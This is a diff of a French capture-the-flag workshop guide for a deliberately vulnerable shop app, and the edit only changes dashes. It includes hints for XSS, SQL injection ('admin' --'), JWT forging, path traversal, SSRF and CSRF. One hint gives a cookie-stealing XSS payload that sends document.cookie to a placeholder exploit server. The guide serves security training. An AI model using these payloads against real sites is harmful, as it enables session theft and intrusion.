@@ -1,4 +1,4 @@
-# BananaShop CTF — Workshop Guide
+# BananaShop CTF - Workshop Guide
 
 ## Challenges
 
@@ -6,7 +6,7 @@ Les 15 challenges sont classés par difficulté croissante. Chaque flag est au f
 
 ---
 
-### Challenge #1 — Sensitive Data Exposure (Facile)
+### Challenge #1 - Sensitive Data Exposure (Facile)
 
 > Les développeurs laissent parfois des endpoints de debug en production...
 
@@ -27,7 +27,7 @@ Les endpoints de debug suivent souvent des conventions de nommage : /debug, /con
 
 ---
 
-### Challenge #2 — IDOR (Facile)
+### Challenge #2 - IDOR (Facile)
 
 > Êtes-vous vraiment limité à votre propre profil ?
 
@@ -43,12 +43,12 @@ Les IDs utilisateur sont des entiers séquentiels. Essayez 1, 2, 3...
 
 <details>
 <summary>Hint 3</summary>
-<code>GET /api/users/3</code> — regardez le champ "bio"
+<code>GET /api/users/3</code> - regardez le champ "bio"
 </details>
 
 ---
 
-### Challenge #3 — Reflected XSS (Facile-Moyen)
+### Challenge #3 - Reflected XSS (Facile-Moyen)
 
 > Que se passe-t-il quand la recherche reflète votre saisie sans la nettoyer ?
 
@@ -69,7 +69,7 @@ Essayez de mettre du HTML dans le champ de recherche. Est-il interprété ?
 
 ---
 
-### Challenge #4 — SQL Injection (Moyen)
+### Challenge #4 - SQL Injection (Moyen)
 
 > Le formulaire de login accepte-t-il plus que des noms d'utilisateur ?
 
@@ -90,7 +90,7 @@ Username : <code>admin' --</code> (avec un espace avant le --), mot de passe : n
 
 ---
 
-### Challenge #5 — Business Logic (Moyen)
+### Challenge #5 - Business Logic (Moyen)
 
 > Les nombres peuvent aller dans les deux sens...
 
@@ -111,7 +111,7 @@ Envoyez <code>-5000</code> crédits à n'importe quel utilisateur. Le flag appar
 
 ---
 
-### Challenge #6 — JWT Forging (Moyen-Difficile)
+### Challenge #6 - JWT Forging (Moyen-Difficile)
 
 > Les secrets devraient être secrets. Celui-ci l'est-il ?
 
@@ -132,7 +132,7 @@ Le secret JWT est littéralement la chaîne <code>"secret"</code>. Changez <code
 
 ---
 
-### Challenge #7 — Stored XSS (Difficile)
+### Challenge #7 - Stored XSS (Difficile)
 
 > Les avis sont rendus tels quels. Qu'est-ce que vous pourriez y injecter ?
 
@@ -153,7 +153,7 @@ Essayez de poster un avis contenant du HTML, par exemple <code>&lt;b&gt;test&lt;
 
 ---
 
-### Challenge #8 — Path Traversal (Facile)
+### Challenge #8 - Path Traversal (Facile)
 
 > Les chemins mènent parfois plus loin que prévu...
 
@@ -164,7 +164,7 @@ L'application a un endpoint pour récupérer des fichiers. Regardez les endpoint
 
 <details>
 <summary>Hint 2</summary>
-<code>GET /api/products/image?file=organic.txt</code> — que se passe-t-il si vous remontez dans l'arborescence ?
+<code>GET /api/products/image?file=organic.txt</code> - que se passe-t-il si vous remontez dans l'arborescence ?
 </details>
 
 <details>
@@ -174,7 +174,7 @@ L'application a un endpoint pour récupérer des fichiers. Regardez les endpoint
 
 ---
 
-### Challenge #10 — CSRF (Moyen)
+### Challenge #10 - CSRF (Moyen)
 
 > Quand un autre site agit en votre nom...
 
@@ -195,7 +195,7 @@ Utilisez la page "CSRF Demo" de l'exploit-server pour générer le payload autom
 
 ---
 
-### Bonus — CORS Reflection + Allow-Credentials (Difficile)
+### Bonus - CORS Reflection + Allow-Credentials (Difficile)
 
 > Le CSRF permet d'envoyer des requêtes... mais peut-on aussi **lire** les réponses ?
 
@@ -216,7 +216,7 @@ Créez une page sur l'exploit-server avec un <code>fetch('http://bananashop/api/
 
 ---
 
-### Challenge #11 — SQL Injection UNION (Difficile)
+### Challenge #11 - SQL Injection UNION (Difficile)
 
 > Quand une requête en cache une autre...
 
@@ -237,7 +237,7 @@ Utilisez UNION SELECT pour extraire des données d'autres tables. Combien de col
 
 ---
 
-### Challenge #12 — SSRF (Difficile)
+### Challenge #12 - SSRF (Difficile)
 
 > Le serveur fait confiance à vos URLs... même les internes.
 
@@ -258,7 +258,7 @@ L'endpoint d'import d'image effectue un fetch côté serveur. Que se passe-t-il 
 
 ---
 
-### Challenge #13 — Cookie Theft via XSS (Difficile)
+### Challenge #13 - Cookie Theft via XSS (Difficile)
 
 > Voler un cookie, c'est voler une identité.
 
@@ -274,5 +274,5 @@ Utilisez une XSS (réfléchie ou stockée) pour envoyer le cookie vers votre exp
 
 <details>
 <summary>Hint 3</summary>
-Postez un avis contenant : <code>&lt;img src=x onerror="fetch('http://VOTRE-EXPLOIT-SERVER/steal?c='+document.cookie)"&gt;</code> — l'exploit-server détecte le JWT et donne le flag.
+Postez un avis contenant : <code>&lt;img src=x onerror="fetch('http://VOTRE-EXPLOIT-SERVER/steal?c='+document.cookie)"&gt;</code> - l'exploit-server détecte le JWT et donne le flag.
 </details>
